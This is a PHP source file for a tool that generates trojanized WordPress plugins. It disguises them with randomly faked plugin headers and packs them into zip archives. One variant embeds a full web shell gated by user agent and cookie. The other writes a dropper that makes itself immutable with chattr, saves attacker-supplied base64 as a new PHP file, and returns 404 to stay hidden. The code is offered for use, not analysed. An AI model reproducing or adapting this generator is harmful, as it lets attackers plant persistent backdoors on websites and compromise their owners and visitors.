<?php

namespace new_bots\wordpressPlugins;

use Faker\Factory;
use phpseclib3\Math\BigInteger\Engines\PHP;


class makeMeWordPressing extends \ZipArchive
{

    private \Faker\Generator $faker;
    protected string $activator;
    protected string $allowed_agent;
    protected string $cookie_name;
    protected string $cookie_value;
    protected string $auth_uuid;
    private string $spoof_directory_name;
    private string $random_name;

    function __construct(string $activator, string $allowed_agent, string $cookie_name, string $cookie_value)
    {
        $this->faker = Factory::create();
        $this->random_name = bin2hex(openssl_random_pseudo_bytes(24));
        $this->activator = $activator;
        $this->allowed_agent = $allowed_agent;
        $this->cookie_name = $cookie_name;
        $this->cookie_value = $cookie_value;
        $this->auth_uuid = vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex(openssl_random_pseudo_bytes(16)), 4));
        $this->spoof_directory_name = $this->faker->word();
        if (is_dir($this->spoof_directory_name)){
            rmdir($this->spoof_directory_name);
            mkdir($this->spoof_directory_name);
        }
        if (!is_dir($this->spoof_directory_name)){
            mkdir($this->spoof_directory_name);
        }
    }

    protected function spoofWordPressHeader(): array
    {
        return [
            "Plugin Name:" => $this->faker->word(),
            "Plugin URI:" => $this->faker->url(),
            "Description:" => $this->faker->sentence(8),
            "Version:" => rand(0, 10) . '.' . rand(0, 50) . '.' . rand(1, 15),
            "Requires At Least:" => floatval(4.1),
            "Requires PHP:" => 7.2,
            "Author:" => $this->faker->firstName . " " . $this->faker->lastName,
            "Author URI:" => $this->faker->url(),
            "License:" => "GPL v2 or later",
            "License URI:" => "https://www.gnu.org/licenses/gpl-2.0.html",
            "Update URI:" => $this->faker->url()
        ];
    }

    /**
     * @throws \Exception
     */
    public function createChonker(): array {
        $spoof = $this->spoofWordPressHeader();
        $base = '';
        $spoof_name = "{$this->spoof_directory_name}/{$this->random_name}.php";
        echo $spoof_name.PHP_EOL;
        foreach ($spoof as $key => $valu){
            $base .= "* {$key} {$valu}\n";
        }
        $base .= "*/\n";
        $slop = file('slop.php');
        if ($slop === false){
            return [
                null
            ];
        }
        $slop[4] = "\tdefine(\"allow_agent\", \"{$this->allowed_agent}\");".PHP_EOL;
        $slop[7] = "\tdefine(\"uuid\", \"{$this->auth_uuid}\");".PHP_EOL;
        $slop[10] = "\tdefine(\"cval\", \"{$this->cookie_value}\");".PHP_EOL;
        $slop[11] = "\tdefine(\"cname\", \"{$this->cookie_name}\");".PHP_EOL;
        foreach (explode($base, "\n") as $baseline){
            $alt = 1;
            $slop[$alt] .= $baseline;
            $alt += 1;
        }
        $slop[array_key_last($slop)-5] = '';
        $slop[array_key_last($slop)-4] = '';
        $slop[array_key_last($slop)-3] = '';
        $slop[array_key_last($slop)-2] = '';
        $slop[array_key_last($slop)-1] = '';
        $slop[array_key_last($slop)] = PHP_EOL."add_action('init', slopp);".PHP_EOL;
        $counter = 0;
        foreach ($slop as $needer){
            $counter += 1;
            if (str_contains($needer, "main()") !== false){
                echo "Overwriting: $needer".PHP_EOL;
                $slop[$counter] = "function {$spoof['Plugin Name:']}(){".PHP_EOL;
                echo $slop[$counter].PHP_EOL;
            }
        }
        file_put_contents($spoof_name, implode("", $slop));
        return [
            "TrojanPlugin" => $this->packZipArchive($spoof_name, $spoof['Plugin Name:'], "chonker"), // activation word is useless because this is the full shell being packaged as a plugin.
            "ActivationWord" => "Chonker-" . bin2hex(openssl_random_pseudo_bytes(10)),
            "UUID" => $this->auth_uuid,
            "CookieValue" => $this->cookie_value,
            "CookieName" => $this->cookie_name,
            "AllowedAgent" => $this->allowed_agent
        ];
    }

    /**
     * @throws \Exception
     */
    public function createSmallTrojanWordpress(): array
    {
        $spoof = $this->spoofWordPressHeader();
        $base = "<?php\n/*\n";
        foreach ($spoof as $key => $valu){
            $base .= "* {$key} {$valu}\n";
        }
        $base .= "*/\n\n";
        $template = <<<TPL
$base
function {$spoof['Plugin Name:']}(){
    @system("chattr +i ".\$_SERVER['SCRIPT_FILENAME']) || @system("chattr +i ". __FILE__);
    if (!is_file('$this->random_name.php')){
        if (!is_writable('.')){
            http_response_code(404);
            echo "CRITICAL ERROR, I CANNOT WRITE TO THIS DIRECTORY! PANIC!";
            die();
        }
        if (isset(\$_REQUEST['{$this->activator}'])){
            file_put_contents('{$this->random_name}.php', base64_decode(\$_REQUEST['$this->activator']));
            header("FileName: {$this->random_name}.php");
            die();
        } else {
            http_response_code(404);
            die();
        }    }else{
        die();
    }
}
add_action('init', {$spoof['Plugin Name:']});
TPL;
        $tr_name = "{$this->spoof_directory_name}/{$this->random_name}.php";
        file_put_contents("{$this->spoof_directory_name}/{$this->random_name}.php", $template);
        return [
            "TrojanPlugin" => $this->packZipArchive($tr_name, $spoof['Plugin Name:'], "slim"),
            "ActivationWord" => $this->activator
        ];
    }

    protected function packZipArchive(string $trojan_script, string $spoof_name, string $type): string {

        $zipper = new \ZipArchive();
        $target_zip_directory = "lib/new_bots/wordpressPlugins/trojanized_plugins/slim/";
        if (str_contains($type, "chonker") !== false){
            $target_zip_directory = "lib/new_bots/wordpressPlugins/trojanized_plugins/chunky/";
        }
        if ($zipper->open("{$target_zip_directory}{$spoof_name}.zip", \ZipArchive::CREATE | \ZipArchive::OVERWRITE) !== true){
            throw new \Exception(PHP_EOL."\033[0;31m[ !! ] PANIC, I CANNOT WRITE THE ZIP ARCHIVE. [ !! ]\033[0m".PHP_EOL);
        }
        $zipper->addFile("{$this->spoof_directory_name}/{$this->random_name}.php");
        $zipper->close();
        unlink($trojan_script);
        rmdir($this->spoof_directory_name);
        return "{$target_zip_directory}{$spoof_name}.zip";
    }
}